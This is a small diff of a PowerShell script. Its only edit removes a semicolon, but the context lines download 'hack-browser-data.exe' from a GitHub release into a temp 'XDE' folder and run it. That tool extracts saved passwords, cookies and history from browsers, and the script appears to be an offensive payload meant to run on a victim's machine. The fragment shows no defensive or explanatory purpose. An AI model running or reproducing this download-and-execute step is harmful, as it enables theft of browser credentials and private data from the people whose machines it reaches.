@@ -13,7 +13,7 @@
 #GET CURRENT LOCATION
 $local = Get-Location
 #DOWNLOAD AND RUN EXECUTABLE
-iwr "https://github.com/AnonymousXempt/XDE/releases/download/XDE/hack-browser-data.exe" -outfile "$env:temp\XDE\hack-browser-data.exe";
+iwr "https://github.com/AnonymousXempt/XDE/releases/download/XDE/hack-browser-data.exe" -outfile "$env:temp\XDE\hack-browser-data.exe"
 start-sleep 5
 .\hack-browser-data.exe
 
